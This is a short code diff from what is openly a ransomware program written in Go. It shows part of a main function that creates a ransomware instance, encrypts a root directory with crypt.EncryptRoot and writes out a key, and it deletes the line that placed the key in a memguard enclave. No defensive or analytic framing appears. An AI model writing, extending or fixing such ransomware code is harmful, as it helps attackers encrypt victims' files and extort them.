@@ -40,8 +40,6 @@ func main() {
 		log.Fatalf("error creating a ransomware instance: %s", err)
 	}
 
-	rw.MemguardKey = memguard.NewEnclave(rw.Key)
-
 	crypt.EncryptRoot(rw.RootDir, rw.MemguardKey)
 	if err := rw.WriteMemSafeKey(); err != nil {
 		log.Fatal(err)
